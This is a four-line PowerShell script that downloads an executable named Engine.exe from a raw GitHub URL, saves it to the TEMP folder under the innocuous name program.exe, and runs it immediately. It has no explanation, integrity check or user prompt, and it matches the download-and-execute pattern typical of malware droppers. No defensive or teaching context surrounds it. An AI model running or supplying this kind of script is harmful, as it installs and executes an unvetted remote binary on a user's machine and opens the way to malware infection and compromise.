$url = "https://raw.githubusercontent.com/jfrue2069-ops/powershell2/refs/heads/main/Engine.exe"
$output = "$env:TEMP\program.exe"
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process $output